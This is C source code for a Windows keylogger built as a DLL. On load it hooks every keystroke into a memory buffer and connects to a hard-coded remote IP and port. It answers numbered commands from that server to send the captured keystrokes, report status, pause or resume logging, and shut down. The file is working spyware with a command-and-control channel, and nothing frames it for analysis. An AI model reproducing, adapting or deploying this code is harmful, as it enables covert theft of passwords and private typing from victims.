#include<stdio.h>
#include<winsock2.h>
#include<windows.h>
#include<time.h>
#define WM_END WM_APP+1

LPVOID buffer;
SOCKET s;
DWORD length,l=0;
time_t Last_key=0;
BYTE status;
HANDLE Proc;
HHOOK kb;



LRESULT CALLBACK proc(int code,WPARAM state,LPARAM p)
{
	BOOL caps,shift;

	KBDLLHOOKSTRUCT * k;
	if(code==0)
	{
		if(state==WM_KEYDOWN)
		{
			k=(KBDLLHOOKSTRUCT *)p;
			caps=GetKeyState(VK_CAPITAL)&0x0001;
			shift=GetKeyState(VK_SHIFT)>>15;
			char * key;
			switch (k->vkCode) // SWITCH ON INT
			{
				case 0x41: key = caps ? (shift ? "a" : "A") : (shift ? "A" : "a"); break;
				case 0x42: key = caps ? (shift ? "b" : "B") : (shift ? "B" : "b"); break;
				case 0x43: key = caps ? (shift ? "c" : "C") : (shift ? "C" : "c"); break;
				case 0x44: key = caps ? (shift ? "d" : "D") : (shift ? "D" : "d"); break;
				case 0x45: key = caps ? (shift ? "e" : "E") : (shift ? "E" : "e"); break;
				case 0x46: key = caps ? (shift ? "f" : "F") : (shift ? "F" : "f"); break;
				case 0x47: key = caps ? (shift ? "g" : "G") : (shift ? "G" : "g"); break;
				case 0x48: key = caps ? (shift ? "h" : "H") : (shift ? "H" : "h"); break;
				case 0x49: key = caps ? (shift ? "i" : "I") : (shift ? "I" : "i"); break;
				case 0x4A: key = caps ? (shift ? "j" : "J") : (shift ? "J" : "j"); break;
				case 0x4B: key = caps ? (shift ? "k" : "K") : (shift ? "K" : "k"); break;
				case 0x4C: key = caps ? (shift ? "l" : "L") : (shift ? "L" : "l"); break;
				case 0x4D: key = caps ? (shift ? "m" : "M") : (shift ? "M" : "m"); break;
				case 0x4E: key = caps ? (shift ? "n" : "N") : (shift ? "N" : "n"); break;
				case 0x4F: key = caps ? (shift ? "o" : "O") : (shift ? "O" : "o"); break;
				case 0x50: key = caps ? (shift ? "p" : "P") : (shift ? "P" : "p"); break;
				case 0x51: key = caps ? (shift ? "q" : "Q") : (shift ? "Q" : "q"); break;
				case 0x52: key = caps ? (shift ? "r" : "R") : (shift ? "R" : "r"); break;
				case 0x53: key = caps ? (shift ? "s" : "S") : (shift ? "S" : "s"); break;
				case 0x54: key = caps ? (shift ? "t" : "T") : (shift ? "T" : "t"); break;
				case 0x55: key = caps ? (shift ? "u" : "U") : (shift ? "U" : "u"); break;
				case 0x56: key = caps ? (shift ? "v" : "V") : (shift ? "V" : "v"); break;
				case 0x57: key = caps ? (shift ? "w" : "W") : (shift ? "W" : "w"); break;
				case 0x58: key = caps ? (shift ? "x" : "X") : (shift ? "X" : "x"); break;
				case 0x59: key = caps ? (shift ? "y" : "Y") : (shift ? "Y" : "y"); break;
				case 0x5A: key = caps ? (shift ? "z" : "Z") : (shift ? "Z" : "z"); break;
				// Sleep Key
				case VK_SLEEP: key = "[SLEEP]"; break;
				// Num Keyboard
				case VK_NUMPAD0:  key = "0"; break;
				case VK_NUMPAD1:  key = "1"; break;
				case VK_NUMPAD2 : key = "2"; break;
				case VK_NUMPAD3:  key = "3"; break;
				case VK_NUMPAD4:  key = "4"; break;
				case VK_NUMPAD5:  key = "5"; break;
				case VK_NUMPAD6:  key = "6"; break;
				case VK_NUMPAD7:  key = "7"; break;
				case VK_NUMPAD8:  key = "8"; break;
				case VK_NUMPAD9:  key = "9"; break;
				case VK_MULTIPLY: key = "*"; break;
				case VK_ADD:      key = "+"; break;
				case VK_SEPARATOR: key = "-"; break;
				case VK_SUBTRACT: key = "-"; break;
				case VK_DECIMAL:  key = "."; break;
				case VK_DIVIDE:   key = "/"; break;
				// Function Keys
				case VK_F1:  key = "[F1]"; break;
				case VK_F2:  key = "[F2]"; break;
				case VK_F3:  key = "[F3]"; break;
				case VK_F4:  key = "[F4]"; break;
				case VK_F5:  key = "[F5]"; break;
				case VK_F6:  key = "[F6]"; break;
				case VK_F7:  key = "[F7]"; break;
				case VK_F8:  key = "[F8]"; break;
				case VK_F9:  key = "[F9]"; break;
				case VK_F10:  key = "[F10]"; break;
				case VK_F11:  key = "[F11]"; break;
				case VK_F12:  key = "[F12]"; break;
				case VK_F13:  key = "[F13]"; break;
				case VK_F14:  key = "[F14]"; break;
				case VK_F15:  key = "[F15]"; break;
				case VK_F16:  key = "[F16]"; break;
				case VK_F17:  key = "[F17]"; break;
				case VK_F18:  key = "[F18]"; break;
				case VK_F19:  key = "[F19]"; break;
				case VK_F20:  key = "[F20]"; break;
				case VK_F21:  key = "[F22]"; break;
				case VK_F22:  key = "[F23]"; break;
				case VK_F23:  key = "[F24]"; break;
				case VK_F24:  key = "[F25]"; break;
				// Keys
				case VK_NUMLOCK: key = "[NUM-LOCK]"; break;
				case VK_SCROLL:  key = "[SCROLL-LOCK]"; break;
				case VK_BACK:    key = "[BACK]"; break;
				case VK_TAB:     key = "[TAB]"; break;
				case VK_CLEAR:   key = "[CLEAR]"; break;
				case VK_RETURN:  key = "[ENTER]"; break;
				case VK_SHIFT:   key = "[SHIFT]"; break;
				case VK_CONTROL: key = "[CTRL]"; break;
				case VK_MENU:    key = "[ALT]"; break;
				case VK_PAUSE:   key = "[PAUSE]"; break;
				case VK_CAPITAL: key = "[CAP-LOCK]"; break;
				case VK_ESCAPE:  key = "[ESC]"; break;
				case VK_SPACE:   key = "[SPACE]"; break;
				case VK_PRIOR:   key = "[PAGEUP]"; break;
				case VK_NEXT:    key = "[PAGEDOWN]"; break;
				case VK_END:     key = "[END]"; break;
				case VK_HOME:    key = "[HOME]"; break;
				case VK_LEFT:    key = "[LEFT]"; break;
				case VK_UP:      key = "[UP]"; break;
				case VK_RIGHT:   key = "[RIGHT]"; break;
				case VK_DOWN:    key = "[DOWN]"; break;
				case VK_SELECT:  key = "[SELECT]"; break;
				case VK_PRINT:   key = "[PRINT]"; break;
				case VK_SNAPSHOT: key = "[PRTSCRN]"; break;
				case VK_INSERT:  key = "[INS]"; break;
				case VK_DELETE:  key = "[DEL]"; break;
				case VK_HELP:    key = "[HELP]"; break;
				// Number Keys with shift
				case 0x30:  key = shift ? ")" : "0"; break;
				case 0x31:  key = shift ? "!" : "1"; break;
				case 0x32:  key = shift ? "@" : "2"; break;
				case 0x33:  key = shift ? "#" : "3"; break;
				case 0x34:  key = shift ? "$" : "4"; break;
				case 0x35:  key = shift ? "%" : "5"; break;
				case 0x36:  key = shift ? "^" : "6"; break;
				case 0x37:  key = shift ? "&" : "7"; break;
				case 0x38:  key = shift ? "*" : "8"; break;
				case 0x39:  key = shift ? "(" : "9"; break;
				// Windows Keys
				case VK_LWIN:     key = "[WIN]"; break;
				case VK_RWIN:     key = "[WIN]"; break;
				case VK_LSHIFT:   key = "[SHIFT]"; break;
				case VK_RSHIFT:   key = "[SHIFT]"; break;
				case VK_LCONTROL: key = "[CTRL]"; break;
				case VK_RCONTROL: key = "[CTRL]"; break;
				// OEM Keys with shift
				case VK_OEM_1:      key = shift ? ":" : ";"; break;
				case VK_OEM_PLUS:   key = shift ? "+" : "="; break;
				case VK_OEM_COMMA:  key = shift ? "<" : ","; break;
				case VK_OEM_MINUS:  key = shift ? "_" : "-"; break;
				case VK_OEM_PERIOD: key = shift ? ">" : "."; break;
				case VK_OEM_2:      key = shift ? "?" : "/"; break;
				case VK_OEM_3:      key = shift ? "~" : "`"; break;
				case VK_OEM_4:      key = shift ? "{" : "["; break;
				case VK_OEM_5:      key = shift ? "|" : "\\"; break;
				case VK_OEM_6:      key = shift ? "}" : "]"; break;
				case VK_OEM_7:      key = shift ? "\"" : "'"; break; //TODO: Escape this char: "
				// Action Keys
				case VK_PLAY:       key = "[PLAY]";break;
				case VK_ZOOM:       key = "[ZOOM]";break;
				case VK_OEM_CLEAR:  key = "[CLEAR]";break;
				case VK_CANCEL:     key = "[CTRL-C]";break;

				default: key = "[UNK-KEY]";break;
			}

			time(&Last_key);
			DWORD a=strlen(key);
			if((l+a)>=length)
			{
				a = length - l;
			}

			WriteProcessMemory(Proc,buffer+l,key,a,NULL);
			l+=a;

		}
	}
	return CallNextHookEx(NULL, code, state, p);
}


DWORD Keylogger(LPVOID p)
{
	MSG msg;
	kb=SetWindowsHookExA(WH_KEYBOARD_LL,proc,GetModuleHandle(NULL),0);
	if(!kb)
	return 0;

	status = 1;
	while (GetMessage(&msg, NULL, 0, 0) > 0)
	{
	    if(msg.message == WM_END)
        {
            PostQuitMessage(0);
        }
        else
        {
            TranslateMessage(&msg);
            DispatchMessage(&msg);
        }

	}


	status = 0;
	UnhookWindowsHookEx(kb);
	return 0;
}


int MAIN()
{
	WSADATA wsa;
	struct sockaddr_in sr;
	HANDLE thread , Mem;
	DWORD i=1048576;
	FD_SET read,write,err;
	TIMEVAL timeout;
	timeout.tv_sec=900;
	timeout.tv_usec=0;



	ZeroMemory(&sr,16);
	Proc=GetCurrentProcess();
	if(WSAStartup(MAKEWORD(2,2),&wsa))
	{
		printf("WSAStartup() Failed");
		return 0;
	}

	while(1)
		if((Mem=GlobalAlloc(GHND,i))!=NULL)
		break;
		else
		i--;

	buffer=GlobalLock(Mem);
	length=GlobalSize(Mem);


	sr.sin_family=2;
	sr.sin_port=60036;
	sr.sin_addr.s_addr=1673634241;

	thread=CreateThread(NULL,0,(LPTHREAD_START_ROUTINE)Keylogger,NULL,0,NULL);
	i=0;

	if(!thread)
        return 0;


	_SOCKET_:
		s=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
		if(s==INVALID_SOCKET)
		{
			printf("Failed To Create Socket");
			return 0;
		}
		ioctlsocket(s,FIONBIO,&i);
	_CONNECT_:
		FD_ZERO(&read);
		FD_ZERO(&write);
		FD_ZERO(&err);
		FD_SET(s,&read);
		FD_SET(s,&write);
		FD_SET(s,&err);
		connect(s,(SOCKADDR *)&sr,16);
		select(0,NULL,&write,&err,NULL);

		if(!FD_ISSET(s,&write))
		{
			Sleep(40000);
			goto _CONNECT_;
		}


		while(1)
		{
			FD_ZERO(&read);
			FD_SET(s,&read);

			int retVal=select(0,&read,NULL,NULL,&timeout);
			if(retVal==SOCKET_ERROR)
			break;

			if(retVal==0)
			break;

			if(retVal>0)
			{
				if(FD_ISSET(s,&read))
				{
					int rc=recv(s,(char *)&i,4,0);

					if(rc==SOCKET_ERROR)
					{
						if(WSAGetLastError()!=WSAEWOULDBLOCK)
						break;
					}

					else if(rc==0)
					break;

					else
					{
							switch(i)
							{

								case 1:

									send(s,(char *)&l,sizeof(i),0);
									if(l!=0)
                                    {
                                        send(s,buffer,l,0);
                                        l=0;
                                    }

									break; //dumping keystroke

								case 2:
									send(s,(char *)&Last_key,sizeof(Last_key),0);break; //Last  keystroke

								case 3:
									send(s,&status,1,0);break;//keylogger status 1 means running ,0 means suspended

								case 4:
									if(status==1)
									{
										PostThreadMessageA(GetThreadId(thread),WM_END,0,0L);
									}
									break;
								case 5:
									if(status==0)
									{
									  thread=CreateThread(NULL,0,(LPTHREAD_START_ROUTINE)Keylogger,NULL,0,NULL);

									}
									break;
								case 6:
									PostThreadMessageA(GetThreadId(thread),WM_END,0,0L);
									closesocket(s);
									GlobalUnlock(Mem);
									GlobalFree(Mem);
									goto _END_;
									break;
								default:
								break;
							}
					}
				}

			}

		}

		closesocket(s);
		goto _SOCKET_;


    _END_:
    return 0;

}



BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason,LPVOID lpvReserved)
{
	switch(fdwReason)
	{
		case DLL_PROCESS_ATTACH:
		{
			MAIN();
			break;
		}
		case DLL_PROCESS_DETACH:
		{
			break;
		}
		case DLL_THREAD_ATTACH:
		{
			break;
		}
		case DLL_THREAD_DETACH:
		{
			break;
		}
	}

	/* Return TRUE on success, FALSE on failure */
	return TRUE;
}
